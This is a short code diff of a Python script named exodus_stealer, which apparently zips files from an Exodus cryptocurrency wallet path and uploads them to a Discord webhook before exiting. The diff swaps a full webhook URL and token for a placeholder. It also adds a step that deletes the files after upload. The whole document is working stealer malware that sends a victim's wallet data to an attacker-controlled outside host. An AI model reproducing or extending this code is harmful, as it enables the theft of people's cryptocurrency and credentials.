@@ -1,11 +1,14 @@
-from helpers.discord import Discord_Webhook_Client
+from colorama import *
 from helpers.files import Files
+from helpers.discord import Discord_Webhook_Client
+
+init(convert=True)
 
 def exodus_stealer():
-
     if Files.path_exists() == True:
         if Files.zip_files() == True:
-            Discord_Webhook_Client.send_file("https://discord.com/api/webhooks/1090007280180797501/pCF8Nb3iv88Vyt9L4mO9RMDD9MPj-XNWj0jve8Yl7NMlbfoQLTePfJddRebmIymtSE_q")
+            Discord_Webhook_Client.send_file("WEBHOOK")
+            Files.remove_files()
             exit(code=None)
         else:
             exit(code=None)
